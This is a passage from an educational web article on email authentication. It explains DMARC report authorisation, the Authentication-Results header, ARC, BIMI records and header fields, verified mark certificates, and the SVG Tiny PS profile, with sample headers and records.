For example, if the <abbr title="Domain-based Message Authentication, Reporting &amp; Conformance">DMARC</abbr> record of <code>example.org</code> includes <code>rua=mailto:dmarc@example.com</code>,
there has to be an approval record at <code>example.org._report._dmarc.example.com</code>.
The <a href="#tool-lookup-dmarc-record">above tool</a> verifies this for you.
If you run a <abbr title="Domain-based Message Authentication, Reporting &amp; Conformance">DMARC</abbr> report analyzer business and want to allow anyone to direct reports to you, you can configure
a <a href="https://en.wikipedia.org/wiki/Wildcard_DNS_record">wildcard record</a> at <code>*._report._dmarc.{YourDomain}</code>.
Since the local part of the report address needs no approval, you should use a dedicated domain for this.
Otherwise, anyone can fill your personal mailbox with <abbr title="Domain-based Message Authentication, Reporting &amp; Conformance">DMARC</abbr> reports.
Due to this approval mechanism, report emails don’t have an <a href="#one-click-unsubscribe">unsubscribe button</a>.
To avoid processing fraudulent reports, all report emails must pass <abbr title="Domain-based Message Authentication, Reporting &amp; Conformance">DMARC</abbr> authentication themselves.</p>

</details>

<details>
  

  <p>The <a href="https://datatracker.ietf.org/doc/html/rfc8601#section-2"><code>Authentication-Results</code> header field</a>
allows incoming mail servers to record the results of various authentication methods so that
<a href="#email-filtering">email filters</a> can use them in their rules and
<a href="#mail-client">mail clients</a> can display them to their users
without having to verify the various authentication methods themselves.
It is a <a href="#trace-information">trace field</a> and should therefore be added at the top of the header,
ideally above the <a href="#trace-information"><code>Received</code> header field</a> so that
downstream agents can determine more easily whether the <code>Authentication-Results</code> header field can be trusted.
Its format is as follows:</p>

  <figure>

    <div><div><pre><code>Authentication-Results: {Verifier} [{Version}][;
  {Method}={Result}[ {PropertyType}.{PropertyName}={Value}]*
]*
</code></pre></div>    </div>

    <figcaption>

The format of the <code>Authentication-Results</code> as specified in <a href="https://datatracker.ietf.org/doc/html/rfc8601#section-2.2"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 8601</a>.
The curly brackets need to be replaced with actual values.
The content in square brackets is optional,
and the asterisk indicates that the preceding content can be repeated.

</figcaption>
  </figure>

  <p>The <code>Verifier</code> is an identifier for the entity which performed the verification,
and the optional <code>Version</code> indicates which version of the field format is in use,
where its current and default value is <code>1</code>.
<a href="https://en.wikipedia.org/wiki/Internet_Assigned_Numbers_Authority"><abbr title="Internet Assigned Numbers Authority">IANA</abbr></a> maintains a long list of
<a href="https://www.iana.org/assignments/email-auth/email-auth.xhtml#email-auth-result-names">authentication methods and their results</a>.
The <code>Method</code> is usually <code>spf</code>, <code>dkim</code>, or <code>dmarc</code>, and the <code>Result</code> is usually <code>pass</code> or <code>fail</code>.
The <code>PropertyType</code> is usually <code>smtp</code> or <code>header</code>, depending on whether the verified property
is from the <a href="#message-versus-envelope"><abbr title="Simple Mail Transfer Protocol">SMTP</abbr> envelope</a> or the <a href="#header-fields-and-body">message header</a>.
For example:</p>

  <figure>

    <div><div><pre><code>Authentication-Results: mx.google.com;
       dkim=pass header.i=@ef1p.com header.s=gm1 header.b=AT6+9nrv;
       spf=pass (google.com: […]) smtp.mailfrom=kaspar@ef1p.com;
       dmarc=pass (p=REJECT sp=REJECT dis=NONE) header.from=ef1p.com
</code></pre></div>    </div>

    <figcaption>

The <code>Authentication-Results</code> header field added by Google when I send an email to Gmail.
<code>[…]</code> is the same comment as in the <a href="#spf-received-header-field"><code>SPF-Received</code> header field</a>.
Gmail doesn’t quite adhere to the standard.
To begin with, it adds the <code>Authentication-Results</code> below the <code>Received</code> header field.
Since <a href="#sender-policy-framework"><abbr title="Sender Policy Framework">SPF</abbr></a> doesn’t authenticate the local part of the <code>MAIL</code> <code>FROM</code> address,
it <a href="https://datatracker.ietf.org/doc/html/rfc8601#section-2.7.2">should not</a> be included in the <code>smtp.mailfrom</code> property.
Furthermore, I have no idea why Gmail includes <code>header.i=@ef1p.com</code> rather than <code>header.d=ef1p.com</code>
in the <a href="#domainkeys-identified-mail"><abbr title="DomainKeys Identified Mail">DKIM</abbr></a> result.
To be fair, the <abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> has <a href="https://datatracker.ietf.org/doc/html/rfc8601#appendix-B.5">one example</a>
using the <a href="#dkim-signature-header-field"><code>d</code> tag</a> and
<a href="https://datatracker.ietf.org/doc/html/rfc8601#appendix-B.6">one example</a> using the <a href="#dkim-signature-header-field"><code>i</code> tag</a>.

</figcaption>
  </figure>

  <p>Incoming mail servers can add a separate <code>Authentication-Results</code> header field
<a href="https://datatracker.ietf.org/doc/html/rfc8601#section-4">for each verified authentication method</a>
or combine the results of all verifications into a single header field.
In order to avoid <a href="https://datatracker.ietf.org/doc/html/rfc8601#section-7.1">forged header fields</a>,
incoming mail servers <a href="https://datatracker.ietf.org/doc/html/rfc8601#section-5">have to remove</a>
all <code>Authentication-Results</code> header fields which use their own identifier as the <code>Verifier</code>.
Since mail clients cannot know whether their incoming mail server supports this standard,
they should interpret this header field <a href="https://datatracker.ietf.org/doc/html/rfc8601#section-4.1">only on the user’s request</a>.
Incoming mail servers could strip all existing <code>Authentication-Results</code> header fields from incoming messages,
but this invalidates any <a href="#domainkeys-identified-mail"><abbr title="DomainKeys Identified Mail">DKIM</abbr> signature</a> which covered one of them.
Furthermore, there doesn’t exist a mechanism yet
which allows mail clients to query the <code>Verifier</code> identifier of their incoming mail server.
Mail clients could send an email to their own address without ever displaying it to the user in order to determine
whether their incoming mail server adds such a header field and what identifier it uses.
Unfortunately, Gmail doesn’t add an <code>Authentication-Results</code> header field to messages sent to your own mailbox.
In order to make use of this header field without prompting the user,
who doesn’t know the answer either, you have to analyze whether most messages in the user’s inbox
have an <code>Authentication-Results</code> header field with the same identifier.
Unfortunately, even this technique fails if server instances use their individual hostname
<a href="https://datatracker.ietf.org/doc/html/rfc8601#section-2.5">as their identifier</a>.</p>

</details>

<details>
  <summary id="authenticated-received-chain">
Authenticated Received Chain (<abbr title="Authenticated Received Chain">ARC</abbr>)
</summary>

  <p><a href="https://en.wikipedia.org/wiki/Authenticated_Received_Chain">Authenticated Received Chain (<abbr title="Authenticated Received Chain">ARC</abbr>)</a>
is an <a href="https://datatracker.ietf.org/doc/html/rfc2026#section-4.2.1">experimental</a> protocol
to convey <a href="#authentication-results-header-field">authentication results</a> across trust boundaries.
It’s specified in <a href="https://datatracker.ietf.org/doc/html/rfc8617"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 8617</a>,
and it introduces the following three header fields,
which are always added <a href="https://datatracker.ietf.org/doc/html/rfc8617#section-3.1">as a set</a>:</p>
  <ul>
    <li><a href="https://datatracker.ietf.org/doc/html/rfc8617#section-4.1.1"><code>ARC-Authentication-Results</code></a>
is a copy of the <a href="#authentication-results-header-field"><code>Authentication-Results</code> header field</a>
with the addition of an <a href="https://datatracker.ietf.org/doc/html/rfc8617#section-4.2.1">instance tag</a>
with the name <code>i</code> to indicate which three <abbr title="Authenticated Received Chain">ARC</abbr> header fields belong to the same set.</li>
    <li><a href="https://datatracker.ietf.org/doc/html/rfc8617#section-4.1.2"><code>ARC-Message-Signature</code></a>
is a <a href="#dkim-signature-header-field"><abbr title="DomainKeys Identified Mail">DKIM</abbr> signature</a> over the potentially modified message,
which may not cover <abbr title="Authenticated Received Chain">ARC</abbr>-related and <a href="#authentication-results-header-field"><code>Authentication-Results</code></a> header fields.
The instance tag replaces <abbr title="DomainKeys Identified Mail">DKIM</abbr>’s <a href="#dkim-signature-header-field"><code>i</code> tag</a>, and for some reason,
the version tag <code>v</code> is not defined for <code>ARC-Message-Signature</code>.</li>
    <li><a href="https://datatracker.ietf.org/doc/html/rfc8617#section-4.1.3"><code>ARC-Seal</code></a> is a <abbr title="DomainKeys Identified Mail">DKIM</abbr>-like signature which covers
<a href="https://datatracker.ietf.org/doc/html/rfc8617#section-5.1.1">all <abbr title="Authenticated Received Chain">ARC</abbr>-related header fields</a> in increasing instance order.
As it doesn’t cover the body of the message and has a defined <a href="#body-and-header-canonicalization">canonicalization</a>,
only the <a href="#dkim-signature-header-field"><abbr title="DomainKeys Identified Mail">DKIM</abbr> tags</a> <code>a</code>, <code>b</code>, <code>d</code>, <code>s</code>, and <code>t</code>
as well as the instance tag <code>i</code> can be used.
A new <code>cv</code> tag is used to record the <a href="https://datatracker.ietf.org/doc/html/rfc8617#section-4.4">chain validation status</a>,
whose value can be <code>pass</code>, <code>fail</code>, or <code>none</code>.</li>
  </ul>

  <p>Intermediary message handlers seal their authentication results
so that the incoming mail server of the recipient can consider to deliver even those messages
whose <a href="#domain-based-message-authentication-reporting-and-conformance"><abbr title="Domain-based Message Authentication, Reporting &amp; Conformance">DMARC</abbr> authentication</a> no longer passes.
These three header fields look as follows:</p>

  <figure>

    <div><div><pre><code>ARC-Seal: i=1; a=rsa-sha256; t=1616059926; cv=none;
        d=google.com; s=arc-20160816;
        b=MoNLEuRiwzIJ7FoSItrs3mzkBjiRhHfrADb6gVmEVHMyH1blgnpjxHqJNygEfYdVNo
         /kMFAxLbM6FPAALqyK6VGsDJQAQpHzGzVx1UQ1URugg28cAo5Kp7gSntyJYYZ1Ni/BCp
         czD915SdxwTtJ9rg0ynFUuZXfi8aAjCcZeVXGdTubDwjgs61v1KfxVf6aWMCLUkr9k9B
         JDiTrr/gyJXD1nLNPHMzRgeveIEWgqWkE32BRSdJ42i9Nq0PAHaN3k5g3z579Li9UW1N
         Oobd/OCvAXD6bEYkmWtUmIIuH4HniCmC9AG7aQ9Ewko35HWwezLP7MvjlCqSYRQHelNa
         UeaQ==
ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=google.com; s=arc-20160816;
        h=to:date:message-id:subject:mime-version:content-transfer-encoding
         :from:dkim-signature;
        bh=gmLzBJCLmp99Kb/Rm3Sh+/9143Y1eDcNI0l8V6LhSLo=;
        b=QTDYEklgqj2/0Vt7k6r2HK9Td7TVDrmnLxSs1de0ruFpjbWznIpKLV2iyFbMvo9GcO
         qKPRZiO76vn0kbxnGiBp5FYOP4d9LES+yR04Nx0CIiJ2iMJfDCUxMicQrc//ZPmM7njk
         iBjNKfxDraSuFq3zh65hlYHH0if41dzLy9cPPVHqSI6luefv8MjMO9tY3/5CBbg4wzIg
         8XM3RLD7lssDrzM8fpUgXW/nKSQav7MKzvXmnTRa43FcGvP3Aq6GQWdVl5gt8tyZWS8f
         zFH+Rn3gGG4/iGru0HGQKvaKZdrtXx43mvFl7LSv2tA+ubNqts/sV/esGQSk2rO6VIAi
         wmKQ==
ARC-Authentication-Results: i=1; mx.google.com;
       dkim=pass header.i=@ef1p.com header.s=gm1 header.b=AT6+9nrv;
       spf=pass (google.com: […]) smtp.mailfrom=kaspar@ef1p.com;
       dmarc=pass (p=REJECT sp=REJECT dis=NONE) header.from=ef1p.com
</code></pre></div>    </div>

    <figcaption>

The <abbr title="Authenticated Received Chain">ARC</abbr> header fields that Gmail added to the message from which I took the
<code>Authentication-Results</code> header field in the <a href="#authentication-results-header-field">previous box</a>.

</figcaption>
  </figure>

  <p>Even after reading the whole <a href="https://datatracker.ietf.org/doc/html/rfc8617"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr></a> and skimming through
the <a href="https://datatracker.ietf.org/doc/html/draft-ietf-dmarc-arc-usage-09">draft on recommended usage</a>,
I still question two aspects of <abbr title="Authenticated Received Chain">ARC</abbr>:</p>
  <ul>
    <li><strong>Desirability</strong>: When it comes to <a href="#spam">spam prevention</a>,
trust based on <a href="#reputation">reputation</a> is inevitable,
but when it comes to <a href="#security">security</a>, you want to reduce trust as much as possible.
By specifying a <a href="#domain-based-message-authentication-reporting-and-conformance"><abbr title="Domain-based Message Authentication, Reporting &amp; Conformance">DMARC</abbr> policy</a> of <code>reject</code>,
a domain owner requests that incoming mail servers deliver messages from their domain
based on strict authentication rather than a historic assessment of the sender’s reputation.
A mail server which accepts a message from a <a href="#mailing-list">mailing list</a>
just because it sealed its authentication results
even though it broke the original <abbr title="DomainKeys Identified Mail">DKIM</abbr> signature by changing the body or the subject
subverts the purpose of <a href="#domain-authentication">domain authentication</a>,
namely knowing with certainty that the delivered messages were not <a href="#spoofing">spoofed</a>.
That messages modified by mail handlers are rejected because they no longer pass <abbr title="Domain-based Message Authentication, Reporting &amp; Conformance">DMARC</abbr> authentication
is <a href="https://mailarchive.ietf.org/arch/msg/ietf-smtp/ssXOFPkZneQMbuT4mO2VEHYUyYs/">a feature, not a bug</a>.</li>
    <li><strong>Necessity</strong>: <a href="#domainkeys-identified-mail"><abbr title="DomainKeys Identified Mail">DKIM</abbr></a> allows any domain to assume responsibility for a message.
Even without <abbr title="Authenticated Received Chain">ARC</abbr>, a mailing list which modifies the content of a message can add its own <abbr title="DomainKeys Identified Mail">DKIM</abbr> signature,
and an incoming mail server is free to deliver the message based on such a signature.
If an incoming mail server trusts a mailing list to authenticate received messages correctly,
it can also trust the mailing list to reject messages which fail <abbr title="Domain-based Message Authentication, Reporting &amp; Conformance">DMARC</abbr> authentication.
I don’t understand what the advantage is of introducing yet another authentication mechanism.</li>
  </ul>

  <p>If you think that I missed the point of <abbr title="Authenticated Received Chain">ARC</abbr>, which might very well be the case,
please <a href="mailto:contact@ef1p.com">let me know</a>.</p>

</details>

<details>
  <summary id="dns-queries-from-your-command-line">
<abbr title="Domain Name System">DNS</abbr> queries from your command line
</summary>

  <p>If you don’t want to use <a href="https://evalapply.org/email/tools/">my tools</a> to query the <abbr title="Domain Name System">DNS</abbr> records,
you can use the <a href="https://en.wikipedia.org/wiki/Dig_(command)"><code>dig</code> command</a>
from your <a href="#command-line-interface">command-line interface</a>:</p>

  

</details>

<h4 id="brand-indicators-for-message-identification">Brand Indicators for Message Identification (<abbr title="Brand Indicators for Message Identification">BIMI</abbr>)</h4>

<p><a href="https://en.wikipedia.org/wiki/Brand_Indicators_for_Message_Identification">Brand Indicators for Message Identification (<abbr title="Brand Indicators for Message Identification">BIMI</abbr>)</a> is an emerging standard,
which allows mail clients to display the <a href="https://en.wikipedia.org/wiki/Logo">logo</a> of the sending company
for emails which passed <a href="#domain-based-message-authentication-reporting-and-conformance"><abbr title="Domain-based Message Authentication, Reporting &amp; Conformance">DMARC</abbr> authentication</a>.
It is specified in <a href="https://datatracker.ietf.org/doc/html/draft-blank-ietf-bimi-02">various</a>
<a href="https://datatracker.ietf.org/doc/html/draft-brotman-ietf-bimi-guidance-03">drafts</a>.
Unlike <a href="#sender-policy-framework"><abbr title="Sender Policy Framework">SPF</abbr></a>, <a href="#domainkeys-identified-mail"><abbr title="DomainKeys Identified Mail">DKIM</abbr></a>,
and <a href="#domain-based-message-authentication-reporting-and-conformance"><abbr title="Domain-based Message Authentication, Reporting &amp; Conformance">DMARC</abbr></a>,
<abbr title="Brand Indicators for Message Identification">BIMI</abbr> is not a <a href="#domain-authentication">domain authentication</a> mechanism.
The idea is that companies can refer to an <a href="#svg-tiny-portable-secure-profile"><abbr title="Scalable Vector Graphics">SVG</abbr> image</a>,
which needs to be <a href="#verified-mark-certificate">certified</a> by a certification authority,
in a <a href="#bimi-dns-record"><abbr title="Domain Name System">DNS</abbr> record</a> at their domain.
By ensuring that <a href="https://en.wikipedia.org/wiki/Trademark">trademarks</a> cannot be abused by scammers,
<abbr title="Brand Indicators for Message Identification">BIMI</abbr> has the potential to eliminate <a href="#homograph-attack">homograph attacks</a> and <a href="#phishing">phishing</a>.
Another goal of <abbr title="Brand Indicators for Message Identification">BIMI</abbr> is to increase <abbr title="Domain-based Message Authentication, Reporting &amp; Conformance">DMARC</abbr> adoption among companies
which value marketing more than security.</p>

<p>The tool below uses <a href="https://developers.google.com/speed/public-dns/docs/doh/json">Google’s <abbr title="Domain Name System">DNS</abbr> <abbr title="Application Programming Interface">API</abbr></a>
to query the <a href="#bimi-dns-record"><abbr title="Brand Indicators for Message Identification">BIMI</abbr> record</a> of the given domain.
<abbr title="Brand Indicators for Message Identification">BIMI</abbr> records are identified with a selector just like <a href="#domainkeys-identified-mail"><abbr title="DomainKeys Identified Mail">DKIM</abbr> records</a>
so that companies can use different logos for different purposes.
The default selector is <code>default</code>.
Google, Yahoo, and Fastmail are running <a href="https://bimigroup.org/bimi-adoption-october-2020/"><abbr title="Brand Indicators for Message Identification">BIMI</abbr> pilots</a>.
Companies which already have a <abbr title="Brand Indicators for Message Identification">BIMI</abbr> record include <code>cnn.com</code>, <code>linkedin.com</code>, and <code>ebay.com</code>.</p>



<details>
  <summary id="bimi-dns-record">
<abbr title="Brand Indicators for Message Identification">BIMI</abbr> <abbr title="Domain Name System">DNS</abbr> record
</summary>

  <p><abbr title="Brand Indicators for Message Identification">BIMI</abbr> records are published as <code>TXT</code> records at <code>{Selector}._bimi.{Domain}</code>.
<a href="https://datatracker.ietf.org/doc/html/draft-blank-ietf-bimi-02#section-4.3"><abbr title="Brand Indicators for Message Identification">BIMI</abbr> selectors</a> can contain periods.
A selector other than <code>default</code> has to be indicated with a <a href="#bimi-header-fields"><code>BIMI-Selector</code> header field</a>.
Indirections with <code>CNAME</code> records <a href="https://datatracker.ietf.org/doc/html/draft-blank-ietf-bimi-02#section-6.3">are allowed</a>.
If no <abbr title="Brand Indicators for Message Identification">BIMI</abbr> record is found at the domain of the <code>From</code> address,
a lookup at the <a href="#organizational-domain">organizational domain</a> is performed.
<abbr title="Brand Indicators for Message Identification">BIMI</abbr> records have the same format as <abbr title="DomainKeys Identified Mail">DKIM</abbr> and <abbr title="Domain-based Message Authentication, Reporting &amp; Conformance">DMARC</abbr> records.
The <a href="https://datatracker.ietf.org/doc/html/draft-blank-ietf-bimi-02#section-4.2">following three tags</a> are currently defined:</p>
  <ul>
    <li><code>v</code>: The version of the <abbr title="Brand Indicators for Message Identification">BIMI</abbr> standard.
This tag has to come first, and the only supported value is <code>BIMI1</code>.</li>
    <li><code>l</code>: The location of the brand indicator.
This tag is required, but its value can be empty.
If a value is provided,
it has to be a single <a href="https://evalapply.org/internet/#hypertext-transfer-protocol"><abbr title="HyperText Transfer Protocol Secure">HTTPS</abbr></a> <a href="https://en.wikipedia.org/wiki/URL"><abbr title="Uniform Resource Locator (the formal name for a web address)">URL</abbr></a>,
which resolves to a <a href="https://datatracker.ietf.org/doc/html/rfc6170#section-5.2">potentially GZIP-compressed <abbr title="Scalable Vector Graphics">SVG</abbr> image</a>.</li>
    <li><code>a</code>: The authority evidence location.
This tag is optional and its value can be empty, but receivers may require it.
If a value is provided, it has to be a single <abbr title="HyperText Transfer Protocol Secure">HTTPS</abbr> <abbr title="Uniform Resource Locator (the formal name for a web address)">URL</abbr>,
which resolves to a valid <a href="#verified-mark-certificate">verified mark certificate (<abbr title="Verified Mark Certificate">VMC</abbr>)</a>.</li>
  </ul>

  <p><abbr title="Brand Indicators for Message Identification">BIMI</abbr> records are valid <a href="https://datatracker.ietf.org/doc/html/draft-blank-ietf-bimi-02#section-7.1">only if</a> the domain has a
<a href="#domain-based-message-authentication-reporting-and-conformance"><abbr title="Domain-based Message Authentication, Reporting &amp; Conformance">DMARC</abbr> policy</a> of <code>quarantine</code> or <code>reject</code>.
In the case of a <code>quarantine</code> policy, the rollout percentage has to be 100% (<code>pct=100</code>).
This ensures that domain owners take care that all their messages pass <abbr title="Domain-based Message Authentication, Reporting &amp; Conformance">DMARC</abbr> authentication.
Additionally, the <a href="#subdomain-policy">subdomain policy</a>
of the <a href="#organizational-domain">organizational domain</a> may not be <code>none</code>.
Including the location of the brand indicator in a new email header field
<a href="https://datatracker.ietf.org/doc/html/draft-bkl-bimi-overview-00.html#section-4.1">was considered</a>
but rejected because the validation of the indicator couldn’t be cached at the domain level.
Here is an example <abbr title="Brand Indicators for Message Identification">BIMI</abbr> record:</p>

  <figure>

    <div><div><pre><code>v=BIMI1; l=https://example.com/logo.svg; a=https://cdn.example.net/certificate.pem
</code></pre></div>    </div>

    <figcaption>

An imaginary <abbr title="Brand Indicators for Message Identification">BIMI</abbr> record with reasonably short addresses.
The files can be hosted on different domains.

</figcaption>
  </figure>

</details>

<details>
  

  <p>The <a href="https://datatracker.ietf.org/doc/html/draft-blank-ietf-bimi-02#section-5"><abbr title="Brand Indicators for Message Identification">BIMI</abbr> draft</a>
defines the following three header fields:</p>
  <ul>
    <li><a href="https://datatracker.ietf.org/doc/html/draft-blank-ietf-bimi-02#section-5.1"><code>BIMI-Selector</code></a>:
The sender can use this header field to specify a selector other than <code>default</code>.
The format of the header field value is <code>v=BIMI1; s={Selector}</code>.
The sender should cover this header field with a <a href="#domainkeys-identified-mail"><abbr title="DomainKeys Identified Mail">DKIM</abbr> signature</a>,
and the recipient should ignore this header field otherwise.</li>
    <li><a href="https://datatracker.ietf.org/doc/html/draft-blank-ietf-bimi-02#section-5.2"><code>BIMI-Location</code></a>:
The incoming mail server can use this header field to record the locations
of the verified brand indicator and the certificate for the mail client.
The format of the header field value is identical to the <a href="#bimi-dns-record"><abbr title="Brand Indicators for Message Identification">BIMI</abbr> record</a>.
Incoming mail servers can <a href="https://datatracker.ietf.org/doc/html/draft-blank-ietf-bimi-02#section-8.7">cache valid indicators</a> and
serve them <a href="https://datatracker.ietf.org/doc/html/draft-brotman-ietf-bimi-guidance-03#section-7.1">directly to their mail clients</a>.</li>
    <li><a href="https://datatracker.ietf.org/doc/html/draft-blank-ietf-bimi-02#section-5.3"><code>BIMI-Indicator</code></a>:
The incoming mail server can use this header field to record the uncompressed brand indicator
encoded in <a href="#content-encoding">Base64</a> for the mail client after having verified the certificate.
If the indicator is neither cached and served nor included in the email header by the incoming mail server,
mail clients have to fetch the indicator
<a href="https://datatracker.ietf.org/doc/html/draft-brotman-ietf-bimi-guidance-03#section-7.4">from the sender</a>
as <a href="#remote-content">remote content</a>.</li>
  </ul>

  <p>The incoming mail server has to <a href="https://datatracker.ietf.org/doc/html/draft-blank-ietf-bimi-02#section-7.8">rename or remove</a>
<code>BIMI-Location</code> and <code>BIMI-Indicator</code> header fields that were added by the sender.
The incoming mail server should record the result of its <abbr title="Brand Indicators for Message Identification">BIMI</abbr> evaluation in the
<a href="#authentication-results-header-field"><code>Authentication-Results</code> header field</a>:</p>

  <figure>

    <div><div><pre><code>Authentication-Results: […]; bimi=[pass|fail|temperror|declined|skipped|none]
    header.d={(Organizational)Domain} header.selector={Selector} policy.authority=[pass|fail|none]
</code></pre></div>    </div>

    <figcaption>

How the <abbr title="Brand Indicators for Message Identification">BIMI</abbr> results should be recorded.
<code>[a|b]</code> means <code>a</code> or <code>b</code>.
The values are described in the <a href="https://datatracker.ietf.org/doc/html/draft-blank-ietf-bimi-02#section-7.7"><abbr title="Brand Indicators for Message Identification">BIMI</abbr> draft</a>.

</figcaption>
  </figure>

  <p>Mail clients should rely on these header fields only if they know that their incoming mail server
<a href="https://datatracker.ietf.org/doc/html/draft-brotman-ietf-bimi-guidance-03#section-7">supports <abbr title="Brand Indicators for Message Identification">BIMI</abbr></a>
and strips these header fields from incoming messages.
Otherwise, a mail client is vulnerable to malicious header fields included by the sender.</p>

</details>

<details>
  <summary id="verified-mark-certificate">
Verified mark certificate (<abbr title="Verified Mark Certificate">VMC</abbr>)
</summary>

  <p><a href="https://datatracker.ietf.org/doc/html/draft-fetch-validation-vmc-wchuang-00">This draft</a>
specifies several requirements for the <a href="https://en.wikipedia.org/wiki/X.509"><abbr title="A standard defining the format of public key certificates">X.509</abbr> certificate</a>
which is used to bind a brand indicator to a domain name:</p>
  <ul>
    <li><a href="https://datatracker.ietf.org/doc/html/draft-fetch-validation-vmc-wchuang-00#section-3.3"><strong>Certificate encoding</strong></a>:
The certificate must be encoded in the <a href="https://en.wikipedia.org/wiki/Privacy-Enhanced_Mail">Privacy-Enhanced Mail (PEM)</a>
format as specified in <a href="https://datatracker.ietf.org/doc/html/rfc7468"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 7468</a>.
The filename specified in the <code>a</code> tag of the <a href="#bimi-dns-record"><abbr title="Brand Indicators for Message Identification">BIMI</abbr> record</a> should have a <code>.pem</code> extension.
The file has to include the certificates of all intermediate certification authorities
up to the root certification authority, whose certificate doesn’t have to be included.</li>
    <li><a href="https://datatracker.ietf.org/doc/html/draft-fetch-validation-vmc-wchuang-00#section-4.1"><strong>Logotype extension</strong></a>:
The brand indicator must be included in the logotype extension for <abbr title="A standard defining the format of public key certificates">X.509</abbr> certificates
as specified in <a href="https://datatracker.ietf.org/doc/html/rfc3709"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 3709</a>.
The <a href="https://datatracker.ietf.org/doc/html/rfc3709#section-4.1">object identifier (<abbr title="Object Identifier">OID</abbr>)</a> of this field is <code>1.3.6.1.5.5.7.1.12</code>.</li>
    <li><a href="https://datatracker.ietf.org/doc/html/draft-fetch-validation-vmc-wchuang-00#section-4.2"><strong><abbr title="Scalable Vector Graphics">SVG</abbr> image</strong></a>:
The brand indicator must be a GZIP-compressed <abbr title="Scalable Vector Graphics">SVG</abbr> image
as specified in the <a href="#svg-tiny-portable-secure-profile">next box</a>.
It has to be <a href="#content-encoding">Base64-encoded</a>
in a <a href="https://en.wikipedia.org/wiki/Data_URI_scheme"><code>data</code> <abbr title="Uniform Resource Locator (the formal name for a web address)">URL</abbr></a>
as specified by <a href="https://datatracker.ietf.org/doc/html/rfc2397"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 2397</a>
and <a href="https://datatracker.ietf.org/doc/html/rfc6170"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 6170</a>.</li>
    <li><a href="https://datatracker.ietf.org/doc/html/draft-fetch-validation-vmc-wchuang-00#section-4.4"><strong>Key usage</strong></a>:
<abbr title="Brand Indicators for Message Identification">BIMI</abbr> introduces a new <a href="https://datatracker.ietf.org/doc/html/rfc5280#section-4.2.1.12">extended key usage</a>
with an <abbr title="Object Identifier">OID</abbr> of <code>1.3.6.1.5.5.7.3.31</code>.
This key usage must be listed in the verified mark certificate
and in the certificate of the issuing certification authority.</li>
    <li><a href="https://datatracker.ietf.org/doc/html/draft-fetch-validation-vmc-wchuang-00#section-4.3"><strong>Name matching</strong></a>:
The domain of the <a href="#bimi-dns-record"><abbr title="Brand Indicators for Message Identification">BIMI</abbr> record</a> with or without the <code>{Selector}._bimi.</code> subdomain must be
included in the <a href="https://datatracker.ietf.org/doc/html/rfc5280#section-4.2.1.6">Subject Alternative Name (SAN) field</a>
of the verified mark certificate.</li>
    <li><a href="https://datatracker.ietf.org/doc/html/draft-fetch-validation-vmc-wchuang-00#section-5.1"><strong>Certificate validation</strong></a>:
The verified mark certificate must include a
<a href="https://en.wikipedia.org/wiki/Certificate_revocation_list">certificate revocation list (<abbr title="Certificate Revocation List">CRL</abbr>)</a>
distribution point as specified in <a href="https://datatracker.ietf.org/doc/html/rfc5280#section-4.2.1.13"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 5280</a>.
The verified mark certificate must also include a
<a href="https://datatracker.ietf.org/doc/html/rfc6962#section-3.2">signed certificate timestamp (<abbr title="Signed Certificate Timestamp">SCT</abbr>)</a>
for <a href="https://en.wikipedia.org/wiki/Certificate_Transparency">Certificate Transparency</a>
as specified in <a href="https://datatracker.ietf.org/doc/html/rfc6962"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 6962</a>.</li>
  </ul>

</details>

<details>
  <summary id="svg-tiny-portable-secure-profile">
<abbr title="Scalable Vector Graphics">SVG</abbr> Tiny Portable/Secure profile
</summary>

  <p><a href="https://en.wikipedia.org/wiki/Scalable_Vector_Graphics">Scalable Vector Graphics (<abbr title="Scalable Vector Graphics">SVG</abbr>)</a>
is a standard for, well, scalable vector graphics.
Since the <a href="https://www.w3.org/TR/SVG11/">full standard</a> is quite large,
a subset of it has been standardized as <a href="https://www.w3.org/TR/SVGTiny12/"><abbr title="Scalable Vector Graphics">SVG</abbr> Tiny</a>.
<a href="https://datatracker.ietf.org/doc/html/draft-svg-tiny-ps-abrotman-01">This draft</a>
introduces a new <abbr title="Scalable Vector Graphics">SVG</abbr> profile called <abbr title="Scalable Vector Graphics">SVG</abbr> Tiny Portable/Secure, or <abbr title="Scalable Vector Graphics">SVG</abbr> Tiny PS for short, for <abbr title="Brand Indicators for Message Identification">BIMI</abbr>.
It disallows the <a href="https://datatracker.ietf.org/doc/html/draft-svg-tiny-ps-abrotman-01#section-2.3">following features</a>
of <abbr title="Scalable Vector Graphics">SVG</abbr> Tiny: raster images, multimedia elements, interactive elements,
links to internal or external resources, scripting, and animation.
The <a href="https://developer.mozilla.org/en-US/docs/Web/SVG/Element/svg"><code>&lt;svg&gt;</code> element</a> of <abbr title="Scalable Vector Graphics">SVG</abbr> Tiny PS documents
must have the <a href="https://datatracker.ietf.org/doc/html/draft-svg-tiny-ps-abrotman-01#section-2.1">following attributes</a>:
<code>xmlns=&#34;http://www.w3.org/2000/svg&#34;</code>, <code>version=&#34;1.2&#34;</code>, and <code>baseProfile=&#34;tiny-ps&#34;</code>.
A <a href="https://developer.mozilla.org/en-US/docs/Web/SVG/Element/title"><code>&lt;title&gt;</code> element</a>
must be present once as a child element of the <code>&lt;svg&gt;</code> element.
Brand indicators should be designed to be displayed as a square or in a circle.
You can use <a href="https://github.com/authindicators/svg-ps-converters">this tool</a> to convert an existing <abbr title="Scalable Vector Graphics">SVG</abbr> image.
You find more information on the <a href="https://bimigroup.org/"><abbr title="Brand Indicators for Message Identification">BIMI</abbr> website</a>.</p>

</details>

<h3 id="transport-security">Transport security</h3>

<p>As discussed earlier, <a href="#extended-simple-mail-transfer-protocol"><abbr title="Extended/Enhanced Simple Mail Transfer Protocol">ESMTP</abbr></a>
uses the <a href="#starttls-extension"><abbr title="Command to Start Transport Layer Security when available">STARTTLS</abbr> extension</a>
